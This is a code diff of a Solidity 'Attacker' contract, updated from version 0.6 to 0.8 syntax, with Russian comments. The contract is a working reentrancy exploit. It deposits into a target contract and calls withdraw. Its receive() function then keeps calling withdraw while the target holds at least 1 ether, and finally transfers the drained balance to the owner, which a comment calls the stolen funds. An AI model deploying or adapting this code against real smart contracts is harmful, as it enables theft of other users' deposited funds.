@@ -1,36 +1,42 @@
 // SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
+pragma solidity ^0.8.0;
 
-import "./IVulnerable.sol";
+interface IVictim {
+    function deposit() external payable;
+    function withdraw(uint256 _amount) external;
+}
 
 contract Attacker {
-    IVulnerable public vulnerableContract;
-    uint256 public numCalls;
-    uint256 public maxCalls = 10;
+    IVictim public victim;
+    address public owner;
 
-    constructor(address _vulnerableContractAddress) public {
-        vulnerableContract = IVulnerable(_vulnerableContractAddress);
+    constructor(address _victimAddress) {
+        victim = IVictim(_victimAddress);
+        owner = msg.sender;
     }
 
-    function fund() public payable {
-        vulnerableContract.deposit.value(msg.value)();
+    // Функция для финансирования атакующего контракта
+    function fund() external payable {}
+
+    // Функция для запуска атаки
+    function attack() external {
+        require(msg.sender == owner, "Not the owner");
+        uint256 initialBalance = address(this).balance;
+
+        // Депозит средств в жертву
+        victim.deposit{value: initialBalance}();
+
+        // Начало атаки
+        victim.withdraw(initialBalance);
     }
 
-    function attack() public {
-        numCalls = 0;
-        vulnerableContract.withdraw(1 ether);
-    }
-
+    // Функция fallback для повторного входа
     receive() external payable {
-        if (numCalls < maxCalls) {
-            numCalls++;
-            // Try to call withdraw and catch any errors
-            (bool success, ) = address(vulnerableContract).call(
-                abi.encodeWithSignature("withdraw(uint256)", 1 ether)
-            );
-            if (!success) {
-                // Reentrant call failed, do nothing
-            }
+        if (address(victim).balance >= 1 ether) {
+            victim.withdraw(1 ether);
+        } else {
+            // Перевод украденных средств владельцу
+            payable(owner).transfer(address(this).balance);
         }
     }
 }
